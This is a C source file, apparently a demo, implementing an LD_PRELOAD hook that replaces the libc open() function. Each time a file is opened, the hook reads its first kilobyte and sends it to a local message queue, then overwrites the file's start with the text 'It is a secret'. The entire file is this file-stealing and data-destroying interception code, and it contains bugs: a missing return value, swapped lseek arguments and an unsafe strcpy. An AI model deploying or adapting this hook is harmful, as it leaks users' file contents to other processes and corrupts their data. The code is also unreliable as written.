#include <stdio.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/msg.h>
#include <string.h>
#include <stdlib.h>

#define READ_SIZE 1024
//#define BUF_SIZE 1024
#define MAX_TEXT 1024
struct msg_st
{
    long int msg_type;
    char text[MAX_TEXT];
};
/*
hook的目标是open，所以typedef了一个OPEN函数指针
hook的目的是要控制函数行为，从原库libc.so.6中拿到open指针，保存成old_open以备调用
*/
typedef int(*OPEN)(const char*, const int,...);

int open(const char *s1, const int a,...)
{
    static void *handle = NULL;
    static OPEN old_open = NULL;

    if( !handle )
    {
        handle = dlopen("libc.so.6", RTLD_LAZY);
        old_open = (OPEN)dlsym(handle, "open");
    }
    printf("oops!!! hack function invoked. s1=<%s> s2=<%d>\n", s1, a);
    int fd =  old_open(s1, a);  //执行原本的open
    char read_buf[1024]; 
    read(fd, read_buf, READ_SIZE); //读文件
    struct msg_st data;
    //char buffer[BUF_SIZE];
    int msgid = -1;

    //建立消息队列
    msgid = msgget((key_t)1234,0666 | IPC_CREAT );
    if(msgid == -1)
    {
        printf("errno msgget\n");
    }
    data.msg_type = 1;
    strcpy(data.text,read_buf);
    if(msgsnd(msgid,(void*)&data,MAX_TEXT,0)==-1) //发消息
    {
        printf("errno msgsnd\n");
    }
    lseek(fd,SEEK_SET,0);
    write(fd,"It is a secret",strlen("It is a sevret"));

}
